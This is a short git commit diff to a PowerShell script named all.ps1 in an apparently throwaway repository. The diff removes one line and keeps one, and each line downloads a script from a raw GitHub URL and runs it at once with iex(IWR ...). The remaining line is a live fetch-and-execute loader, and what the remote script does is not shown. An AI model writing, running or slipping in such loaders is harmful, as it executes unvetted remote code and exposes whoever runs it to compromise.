554c5dd937957211616b8cc31d07f6e9e19b3be3
justsomedummythings <148684330+justsomedummythings@users.noreply.github.com>
2023-10-22 15:53:21 +0300

    Update all.ps1

--- all.ps1
+++ all.ps1
@@ -1,2 +1,1 @@
 iex(IWR https://raw.githubusercontent.com/justsomedummythings/testing/main/b.ps1 -UseBasicParsing);
-iex(IWR https://raw.githubusercontent.com/justsomedummythings/testing/main/main.ps1 -UseBasicParsing);
